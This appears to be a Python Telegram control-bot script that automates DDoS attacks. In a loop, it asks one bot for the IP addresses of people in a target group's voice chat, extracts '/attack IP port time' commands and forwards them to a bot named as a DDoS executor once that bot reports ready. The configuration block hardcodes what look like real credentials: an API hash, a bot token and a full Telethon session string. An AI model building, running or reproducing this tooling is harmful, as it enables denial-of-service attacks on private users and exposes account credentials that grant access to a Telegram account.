import asyncio
import re
from telethon import TelegramClient, events
from telethon.sessions import StringSession

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes

# ================== YOUR CONFIG ==================
API_ID = 36295148
API_HASH = "bee66be844e3be0e314508e92a7c4e7d"

BOT_TOKEN = "8257314385:AAF1Fu0xaaXKZB-jZnn4e1og4fX8RSjLkmM"

BOT_A = "@botbysahilbot"          # IP BOT
BOT_B = "@DDOS_Aditya_xd_bot"     # TASK EXECUTER BOT

STRING_SESSION = "1BVtsOKEBu502_IqKteaXEshN7yLh50dvjgNG7WFdv2SNMNtJOHSxj7RgTF5qUIIMziiQPAG5irsAx37rfUZra0WJqTRjSox2F7NSUqUi9_bSizm3sfw3Ez5GszsCnrgY7IVixINZgjWQobFkg4JmOePZb14z6XNO1e1oqNQ_oxugaQN0cBB3IWaH0BaY4G8-O4IfF3GsY_QIbFlLdJeLCxIA6Tah1SHTrTdK4reg_9Vig2snpHSri02cNdkoawDBk1QUyo3mL6r4v7uuO0b5w7LpwjCmJnvYUaWOH0uy14seFuaU4gSnQNvvz79sK_p8vQoZm6h2HLUIOwZLZRugWZ-_iRiaYiU="
# =================================================

tele = TelegramClient(StringSession(STRING_SESSION), API_ID, API_HASH)

chat_targets = {}        # chat_id -> link/chatid
loop_tasks = {}          # chat_id -> asyncio.Task
waiting_futures = {}     # chat_id -> future
bot_b_status = "UNKNOWN"

IP_CMD_REGEX = re.compile(r"/attack\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\d+)", re.I)


# ---------------- BOT-A LISTENER ----------------
@tele.on(events.NewMessage(from_users=BOT_A))
async def bot_a_listener(event):
    text = event.text or ""
    for cid, fut in list(waiting_futures.items()):
        if not fut.done():
            fut.set_result(text)
            waiting_futures.pop(cid, None)


# ---------------- BOT-B LISTENER ----------------
@tele.on(events.NewMessage(from_users=BOT_B))
async def bot_b_listener(event):
    global bot_b_status
    t = (event.text or "").lower()

    if "ready" in t:
        bot_b_status = "READY"
    elif "running" in t:
        bot_b_status = "RUNNING"
    elif "cooldown" in t:
        bot_b_status = "COOLDOWN"
    else:
        bot_b_status = "UNKNOWN"


# ---------------- CORE LOOP ----------------
async def main_loop(chat_id: int, context: ContextTypes.DEFAULT_TYPE):
    while True:
        target = chat_targets.get(chat_id)
        if not target:
            return

        # 1️⃣ Ask IP BOT
        fut = asyncio.get_event_loop().create_future()
        waiting_futures[chat_id] = fut
        await tele.send_message(BOT_A, f".getip all {target}")

        try:
            reply = await asyncio.wait_for(fut, timeout=30)
        except asyncio.TimeoutError:
            await asyncio.sleep(5)
            continue

        match = IP_CMD_REGEX.search(reply or "")
        if not match:
            # No active VC
            await asyncio.sleep(5)
            continue

        attack_cmd = match.group(0)

        # 2️⃣ Check BOT-B status before sending
        while True:
            await tele.send_message(BOT_B, "/status")
            await asyncio.sleep(2)

            if bot_b_status == "READY":
                break

            await asyncio.sleep(5)

        # 3️⃣ Send command to BOT-B
        await tele.send_message(BOT_B, attack_cmd)

        await context.bot.send_message(
            chat_id,
            f"✅ Task sent:\n`{attack_cmd}`",
            parse_mode="Markdown"
        )

        await asyncio.sleep(3)


# ---------------- COMMANDS ----------------
async def setlink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text(
            "Usage:\n/setlinkchatid <group_link_or_chatid>"
        )
        return

    chat_targets[update.effective_chat.id] = " ".join(context.args)
    await update.message.reply_text("✅ Link / ChatID saved")


async def startloop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    if cid in loop_tasks:
        await update.message.reply_text("⚠️ Loop already running")
        return

    task = asyncio.create_task(main_loop(cid, context))
    loop_tasks[cid] = task
    await update.message.reply_text("🔁 Loop started")


async def stoploop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cid = update.effective_chat.id
    task = loop_tasks.pop(cid, None)

    if task:
        task.cancel()
        await update.message.reply_text("🛑 Loop stopped")
    else:
        await update.message.reply_text("No active loop running")


# ---------------- MAIN ----------------
async def main():
    # Start Telethon
    await tele.start()
    print("🧵 Telethon connected")

    # Telegram bot
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("setlinkchatid", setlink))
    app.add_handler(CommandHandler("startloop", startloop))
    app.add_handler(CommandHandler("stoploop", stoploop))

    print("🤖 Control bot running")

    # ✅ ONE polling instance ONLY
    await app.run_polling(close_loop=False)
if __name__ == "__main__":
    asyncio.run(main())